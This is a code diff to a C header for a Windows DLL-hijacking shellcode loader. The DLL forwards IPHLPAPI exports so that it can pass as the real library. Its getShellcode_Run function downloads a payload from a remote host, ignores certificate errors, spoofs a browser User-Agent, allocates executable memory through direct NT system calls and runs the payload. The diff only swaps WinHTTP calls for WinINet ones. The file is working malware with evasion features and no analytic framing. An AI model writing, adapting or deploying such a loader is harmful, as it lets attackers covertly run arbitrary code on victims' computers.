@@ -1,10 +1,9 @@
 #pragma once
 #include <windows.h>
-#include <winhttp.h>
+#include <wininet.h>
 #include <stdio.h>
 
-#pragma comment(lib, "ntdll")
-#pragma comment(lib, "winhttp.lib")
+#pragma comment(lib, "wininet.lib")
 #pragma comment(linker,"/export:AddIPAddress=C:\\Windows\\System32\\IPHLPAPI.AddIPAddress,@1")
 #pragma comment(linker,"/export:AllocateAndGetInterfaceInfoFromStack=C:\\Windows\\System32\\IPHLPAPI.AllocateAndGetInterfaceInfoFromStack,@2")
 #pragma comment(linker,"/export:AllocateAndGetIpAddrTableFromStack=C:\\Windows\\System32\\IPHLPAPI.AllocateAndGetIpAddrTableFromStack,@3")
@@ -318,82 +317,54 @@ EXTERN_C NTSTATUS NtCreateThreadEx(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, P
 EXTERN_C NTSTATUS NtWaitForSingleObject(HANDLE, BOOLEAN, PLARGE_INTEGER);
 
 void getShellcode_Run(char* host, char* port, char* resource) {
-    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
+    HINTERNET hInternet = NULL, hConnect = NULL, hRequest = NULL;
     BOOL bResults = FALSE;
     DWORD dwSize = 0, dwDownloaded = 0;
     LPSTR pszOutBuffer = NULL;
 
-    wchar_t wHost[100], wResource[100];
-    MultiByteToWideChar(CP_ACP, 0, host, -1, wHost, 100);
-    MultiByteToWideChar(CP_ACP, 0, resource, -1, wResource, 100);
-
-    hSession = WinHttpOpen(L"Shellcode Loader", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-    if (!hSession) {
+    hInternet = InternetOpen(L"Shellcode Loader", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    if (!hInternet) {
         char msg[256];
-        sprintf_s(msg, "WinHttpOpen failed with error: %ld\n", GetLastError());
+        sprintf_s(msg, "InternetOpen failed with error: %ld\n", GetLastError());
         OutputDebugStringA(msg);
         goto cleanup;
     }
 
-    // Set TLS 1.2 only
-    DWORD tlsFlags = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
-    if (!WinHttpSetOption(hSession, WINHTTP_OPTION_SECURE_PROTOCOLS, &tlsFlags, sizeof(tlsFlags))) {
-        char msg[256];
-        sprintf_s(msg, "WinHttpSetOption (TLS) failed with error: %ld\n", GetLastError());
-        OutputDebugStringA(msg);
-    }
-
-    hConnect = WinHttpConnect(hSession, wHost, atoi(port), 0);
+    hConnect = InternetConnectA(hInternet, host, atoi(port), NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
     if (!hConnect) {
         char msg[256];
-        sprintf_s(msg, "WinHttpConnect failed with error: %ld\n", GetLastError());
+        sprintf_s(msg, "InternetConnect failed with error: %ld\n", GetLastError());
         OutputDebugStringA(msg);
         goto cleanup;
     }
 
-    hRequest = WinHttpOpenRequest(hConnect, L"GET", wResource, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+    hRequest = HttpOpenRequestA(hConnect, "GET", resource, NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
     if (!hRequest) {
         char msg[256];
-        sprintf_s(msg, "WinHttpOpenRequest failed with error: %ld\n", GetLastError());
+        sprintf_s(msg, "HttpOpenRequest failed with error: %ld\n", GetLastError());
         OutputDebugStringA(msg);
         goto cleanup;
     }
 
-    // Apply SSL bypass flags
-    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | 
-                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | 
-                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID | 
-                  SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
-    if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags))) {
-        char msg[256];
-        sprintf_s(msg, "WinHttpSetOption (security flags) failed with error: %ld\n", GetLastError());
-        OutputDebugStringA(msg);
-        goto cleanup;
-    }
+    // Add headers
+    char headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n"
+                     "Accept: */*\r\n"
+                     "Connection: keep-alive\r\n";
+    HttpAddRequestHeadersA(hRequest, headers, -1L, HTTP_ADDREQ_FLAG_ADD);
 
-    // Add User-Agent header to mimic a browser
-    LPCWSTR headers = L"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n";
-    bResults = WinHttpSendRequest(hRequest, headers, -1L, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+    bResults = HttpSendRequestA(hRequest, NULL, 0, NULL, 0);
     if (!bResults) {
         char msg[256];
-        sprintf_s(msg, "WinHttpSendRequest failed with error: %ld\n", GetLastError());
-        OutputDebugStringA(msg);
-        goto cleanup;
-    }
-
-    bResults = WinHttpReceiveResponse(hRequest, NULL);
-    if (!bResults) {
-        char msg[256];
-        sprintf_s(msg, "WinHttpReceiveResponse failed with error: %ld\n", GetLastError());
+        sprintf_s(msg, "HttpSendRequest failed with error: %ld\n", GetLastError());
         OutputDebugStringA(msg);
         goto cleanup;
     }
 
     do {
         dwSize = 0;
-        if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
+        if (!InternetQueryDataAvailable(hRequest, &dwSize, 0, 0)) {
             char msg[256];
-            sprintf_s(msg, "WinHttpQueryDataAvailable failed with error: %ld\n", GetLastError());
+            sprintf_s(msg, "InternetQueryDataAvailable failed with error: %ld\n", GetLastError());
             OutputDebugStringA(msg);
             break;
         }
@@ -406,7 +377,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         }
         ZeroMemory(pszOutBuffer, dwSize + 1);
 
-        if (WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {
+        if (InternetReadFile(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {
             PVOID shellcodeAddr = NULL;
             SIZE_T shellcodeSize = dwDownloaded;
             NTSTATUS status = NtAllocateVirtualMemory(NtCurrentProcess(), &shellcodeAddr, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -425,9 +396,9 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     } while (dwSize > 0);
 
 cleanup:
-    if (hRequest) WinHttpCloseHandle(hRequest);
-    if (hConnect) WinHttpCloseHandle(hConnect);
-    if (hSession) WinHttpCloseHandle(hSession);
+    if (hRequest) InternetCloseHandle(hRequest);
+    if (hConnect) InternetCloseHandle(hConnect);
+    if (hInternet) InternetCloseHandle(hInternet);
 }
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
